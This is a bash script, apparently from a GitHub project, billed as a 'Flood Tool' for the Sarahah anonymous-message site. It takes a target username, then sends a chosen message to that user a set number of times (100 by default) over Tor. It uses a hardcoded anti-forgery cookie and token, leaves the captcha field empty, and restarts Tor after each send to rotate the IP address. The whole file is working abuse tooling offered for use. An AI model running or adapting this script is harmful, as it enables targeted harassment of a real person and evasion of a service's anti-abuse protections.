#!/bin/bash
# Sarahaha v1.0
# Author: @thelinuxchoice
# https://github.com/thelinuxchoice/sarahaha

banner() {

printf " \e[1;77m  ____                  _           _            \n"
printf "  / ___|  __ _ _ __ __ _| |__   __ _| |__   __ _  \n"
printf "  \___ \ / _\` | '__/ _\` | '_ \ / _\` | '_ \ / _\` | \n"
printf "   ___) | (_| | | | (_| | | | | (_| | | | | (_| | \n"
printf "  |____/ \__,_|_|  \__,_|_| |_|\__,_|_| |_|\__,_| v1.0\e[0m\n"
printf "   \e[1;77mFlood Tool, \e[0m\e[1;92mAuthor: @thelinuxchoice\e[0m\n"
printf "\n"                                                
}

checktor() {

checktor=$(curl -s --socks5-hostname localhost:9050 "https://check.torproject.org" > /dev/null; echo $?)

if [[ $checktor -gt 0 ]]; then
printf "\e[1;93m[!] It Requires Tor! Please, install it or check your TOR connection!\e[0m\n"
exit 1
fi

}


start() {

read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Sarahah Username: ' username
checkuser=$(curl -s -i https://$username.sarahah.com -L | grep -o 'User Not Found')

if [[ $checkuser == *'User Not Found'* ]]; then
printf "\e[1;93m[!] User Not Found, try again!\e[0m\n"
sleep 1
start
fi

IFS=$'\n'
default_amount="100"
default_message="sorry the flood"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Message (+7 chars): ' message
message="${message:-${default_message}}"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Amount message (Default: 100): ' amount
amount="${amount:-${default_amount}}"
curl --socks5-hostname localhost:9050 -i -s -L -H $"Host: "$username".sarahah.com" -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $"Referer: https://"$username".sarahah.com/" $""$username".sarahah.com" > temp_user
#cookie=$(grep 'Set-Cookie:' temp_user | cut -d ';' -f1)
cookie=".AspNetCore.Antiforgery.w5W7x28NAIs=CfDJ8JbdOS7FMYdKkkQ4WK5l2yYa-z-QV1MC7MMeezF2zKu3wXHmB-Lpj6G4qvmMZKwA6my5GRHvU-wLy3ekicCYiIeSb_65eEv6eSM5jVfo_Oa5gcYVwbsmC9yHSjXcdyhXxz4i9zmbEtdNDT8dTYG-COc"
#token=$(grep "__RequestVerificationToken: '" temp_user | cut -d "'" -f2)

token="CfDJ8JbdOS7FMYdKkkQ4WK5l2yabopKbjNNOAiv2FAyjF-mKyXDBY_9RI_umq1l66dMu6v-YecKKFZj3FjZcJrxN5kNic541MFN1Bgf_T_ccCC2CAc_-w7ydSBLBXaofT2Clh06lFr5kAhLJ0EajBmDzAJc"
userid=$(grep -a "reportedUserId:" temp_user | cut -d "'" -f2)


for i in $(seq 1 $amount); do

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Sending message:\e[0m\e[1;93m %s\e[0m\e[1;77m/\e[0m\e[1;93m%s ...\e[0m" $i $amount
IFS=$'\n'
send=$(curl --socks5 localhost:9050 -i -s -k  -X $'POST'     -H $"Host: "$username".sarahah.com" -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $"Referer: https://"$username".sarahah.com/" -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 256' -H "Cookie: "$cookie"; mnet_session_depth=1%7C1534551935648; session_depth=testingpurposes.sarahah.com%3D1%7C355476528%3D1" -H $'Connection: close'     -b ""$cookie"; mnet_session_depth=1%7C1534551935648; session_depth=testingpurposes.sarahah.com%3D1%7C355476528%3D1"     --data-binary "__RequestVerificationToken="$token"&userId="$userid"&text="$message"&captchaResponse="     $"https://"$username".sarahah.com/Messages/SendMessage" | grep 'HTTP/1.1 200'; echo $?)

if [[ $send == "1" ]]; then
printf "\e[1;93m Fail\n\e[0m"
else
printf "\e[1;92m Done\n\e[0m"
fi
killall -HUP tor
sleep 1
done
rm -rf temp_user
exit 1
}
banner
checktor
start

